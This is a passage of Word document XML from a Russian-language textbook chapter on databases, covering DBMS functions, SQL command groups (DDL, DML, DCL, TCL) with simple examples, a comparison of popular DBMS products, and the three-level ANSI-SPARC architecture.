        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> БД — это библиотека (книги на полках), а СУБД — это библиотекарь, который знает, где какая книга лежит, может быстро найти нужную, выдать тебе, и записать, что ты взял.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Без СУБД БД — это просто файлы на диске. СУБД делает всю магию: парсит SQL-запросы, оптимизирует их, выполняет, управляет транзакциями, блокировками, индексами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Функции СУБД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>СУБД выполняет 4 основные группы функций:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. DDL (Data Definition Language) — Определение данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Создание структуры БД: таблицы, индексы, ограничения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Команды:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`CREATE TABLE` — создать таблицу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ALTER TABLE` — изменить структуру таблицы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`DROP TABLE` — удалить таблицу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`CREATE INDEX` — создать индекс</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE students (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(100) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    age INT CHECK (age &gt;= 16),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email VARCHAR(100) UNIQUE</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. DML (Data Manipulation Language) — Манипуляция данными</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Работа с данными: добавление, изменение, удаление, поиск.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Команды:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`INSERT` — добавить запись</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`UPDATE` — изменить запись</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`DELETE` — удалить запись</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`SELECT` — выбрать записи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Добавить студента</w:t>
        <w:br/>
        <w:t>INSERT INTO students (name, age, email) VALUES ('Иван Иванов', 20, 'ivan@mail.ru');</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Найти всех студентов старше 18 лет</w:t>
        <w:br/>
        <w:t>SELECT * FROM students WHERE age &gt; 18;</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Изменить возраст студента</w:t>
        <w:br/>
        <w:t>UPDATE students SET age = 21 WHERE email = 'ivan@mail.ru';</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Удалить студента</w:t>
        <w:br/>
        <w:t>DELETE FROM students WHERE id = 5;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. DCL (Data Control Language) — Контроль доступа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Управление правами пользователей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Команды:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`GRANT` — дать права</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`REVOKE` — отозвать права</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Дать пользователю manager право читать таблицу orders</w:t>
        <w:br/>
        <w:t>GRANT SELECT ON orders TO manager;</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Отозвать право изменять таблицу orders</w:t>
        <w:br/>
        <w:t>REVOKE UPDATE ON orders FROM manager;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. TCL (Transaction Control Language) — Управление транзакциями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Транзакция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это последовательность операций, которая выполняется как единое целое (либо все операции успешны, либо ни одной).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Команды:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`BEGIN` / `START TRANSACTION` — начать транзакцию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`COMMIT` — зафиксировать изменения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ROLLBACK` — откатить изменения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>START TRANSACTION;</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Списать 100 рублей со счёта Ивана</w:t>
        <w:br/>
        <w:t>UPDATE accounts SET balance = balance - 100 WHERE user = 'Ivan';</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Добавить 100 рублей на счёт Петра</w:t>
        <w:br/>
        <w:t>UPDATE accounts SET balance = balance + 100 WHERE user = 'Petr';</w:t>
        <w:br/>
        <w:br/>
        <w:t>COMMIT;  -- Если всё ОК, зафиксировать</w:t>
        <w:br/>
        <w:t>-- Или ROLLBACK, если что-то пошло не так</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если между двумя операциями произошёл сбой (отключилось электричество), без транзакции деньги могут "потеряться" (списались с Ивана, но не добавились Петру). С транзакцией — либо обе операции выполнятся, либо ни одна.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры СУБД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| СУБД | Тип | Платная? | Описание |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|-----|----------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Реляционная | Бесплатная (Community Edition) | Самая популярная open-source СУБД. Используют WordPress, Joomla, Facebook (ранние версии). |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PostgreSQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Реляционная | Бесплатная | Более "продвинутая" чем MySQL: поддержка JSON, массивов, full-text search. Используют Instagram, Reddit, Spotify. |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Oracle Database</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Реляционная | Платная (дорогая) | Корпоративная СУБД для банков, гос. структур. Мощная, но стоит как самолёт. |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MS SQL Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Реляционная | Платная (есть Express бесплатная) | От Microsoft. Хорошо интегрируется с .NET, Windows. |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SQLite</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Реляционная | Бесплатная | Лёгкая встраиваемая СУБД (один файл). Используют мобильные приложения (Android, iOS). |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MongoDB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Документоориентированная (NoSQL) | Бесплатная (Community) | Хранит данные в JSON-подобном формате. Хороша для гибких схем (не надо заранее задавать структуру таблиц). |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Ключ-значение (NoSQL) | Бесплатная | In-memory БД (данные в оперативной памяти). Используют для кэширования, очередей. Очень быстрая. |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cassandra</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Колоночная (NoSQL) | Бесплатная | Распределённая БД для больших данных. Используют Netflix, Uber. |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Neo4j</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Графовая (NoSQL) | Бесплатная (Community) | Для хранения графов (социальные сети, рекомендательные системы). |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Какую выбрать?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простой сайт / приложение → **MySQL** или **PostgreSQL**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мобильное приложение → **SQLite**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Микросервисы, гибкая схема → **MongoDB**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кэширование, очереди → **Redis**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Социальная сеть, рекомендации → **Neo4j**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.3. Архитектура БД (трёхуровневая модель ANSI-SPARC)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Представь: у тебя университет. Есть 3 типа пользователей:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Студент** — видит только свои оценки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Преподаватель** — видит оценки студентов своих курсов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Декан** — видит всё: оценки всех студентов, зарплаты преподавателей, финансы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Как организовать БД, чтобы каждый видел только то, что ему нужно? Вот для этого придумали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>трёхуровневую архитектуру ANSI-SPARC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (стандарт 1975 года).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Три уровня архитектуры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌─────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│  Внешний уровень (External Level)   │  ← Представления (Views) для пользователей</w:t>
        <w:br/>
        <w:t>│  Студент видит: свои оценки         │</w:t>
        <w:br/>
        <w:t>│  Преподаватель видит: оценки курса  │</w:t>
        <w:br/>
        <w:t>└─────────────────────────────────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">            ↓ Отображение</w:t>
        <w:br/>
        <w:t>┌─────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│ Концептуальный уровень (Conceptual) │  ← Логическая структура всей БД (таблицы, связи)</w:t>
        <w:br/>
        <w:t>│  Таблицы: Students, Courses, Grades │</w:t>
        <w:br/>
        <w:t>└─────────────────────────────────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">            ↓ Отображение</w:t>
        <w:br/>
        <w:t>┌─────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│  Внутренний уровень (Internal)      │  ← Физическое хранение данных (файлы, индексы)</w:t>
        <w:br/>
        <w:t>│  Файлы на диске, B-деревья, буферы  │</w:t>
        <w:br/>
        <w:t>└─────────────────────────────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 1: Внешний (External / View Level)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Представления данных для пользователей и приложений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Конечные пользователи (студенты, преподаватели, админы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>представления (Views)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — виртуальные таблицы, созданные SQL-запросами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Представления для университета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Представление для студента (только свои оценки)</w:t>
        <w:br/>
        <w:t>CREATE VIEW my_grades AS</w:t>
        <w:br/>
        <w:t>SELECT courses.name, grades.score, grades.date</w:t>
        <w:br/>
        <w:t>FROM grades</w:t>
        <w:br/>
        <w:t>JOIN courses ON grades.course_id = courses.id</w:t>
        <w:br/>
        <w:t>WHERE grades.student_id = CURRENT_USER_ID();  -- ID текущего пользователя</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Представление для преподавателя (оценки студентов своих курсов)</w:t>
        <w:br/>
        <w:t>CREATE VIEW my_students_grades AS</w:t>
        <w:br/>
        <w:t>SELECT students.name, courses.name, grades.score</w:t>
        <w:br/>
        <w:t>FROM grades</w:t>
        <w:br/>
        <w:t>JOIN students ON grades.student_id = students.id</w:t>
        <w:br/>
        <w:t>JOIN courses ON grades.course_id = courses.id</w:t>
        <w:br/>
        <w:t>WHERE courses.teacher_id = CURRENT_USER_ID();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Студент делает запрос:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT * FROM my_grades;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Он видит только свои оценки, хотя физически в таблице `grades` лежат оценки всех студентов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Безопасность:** каждый видит только то, что ему разрешено</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Упрощение:** пользователю не надо знать структуру всех таблиц, он работает с простым представлением</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 2: Концептуальный (Conceptual / Logical Level)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Логическая структура всей БД (какие таблицы, какие столбцы, какие связи).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Разработчики, архитекторы БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Схема БД (ER-диаграмма → таблицы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Концептуальная схема университета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица студентов</w:t>
        <w:br/>
        <w:t>CREATE TABLE students (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(100),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email VARCHAR(100) UNIQUE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    group_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (group_id) REFERENCES groups(id)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица курсов</w:t>
        <w:br/>
        <w:t>CREATE TABLE courses (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(100),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    credits INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    teacher_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (teacher_id) REFERENCES teachers(id)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица оценок</w:t>
        <w:br/>
        <w:t>CREATE TABLE grades (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    student_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    course_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    score INT CHECK (score &gt;= 0 AND score &lt;= 100),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    date DATE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (student_id, course_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (student_id) REFERENCES students(id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (course_id) REFERENCES courses(id)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Описывает всю логику предметной области (что с чем связано)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не зависит от конкретной СУБД (можно портировать с MySQL на PostgreSQL)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 3: Внутренний (Internal / Physical Level)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Физическое хранение данных на диске (файлы, индексы, буферы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DBA (администраторы БД), разработчики СУБД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файловая структура (InnoDB, MyISAM для MySQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Индексы (B-деревья, хэш-таблицы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буферы (кэш в оперативной памяти)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4: Физическая структура</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Создать индекс для ускорения поиска студентов по email</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_email ON students(email);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Задать тип таблицы (для MySQL)</w:t>
        <w:br/>
        <w:t>ALTER TABLE students ENGINE = InnoDB;  -- поддержка транзакций, внешних ключей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что происходит на диске:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Таблица `students` хранится в файле `students.ibd` (InnoDB)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Индекс `idx_email` — это B-дерево, хранится в том же файле</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При поиске `WHERE email = 'ivan@mail.ru'` СУБД использует индекс (O(log n) вместо O(n))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация производительности (индексы, кэширование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Управление дисковым пространством (сжатие, партиционирование)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
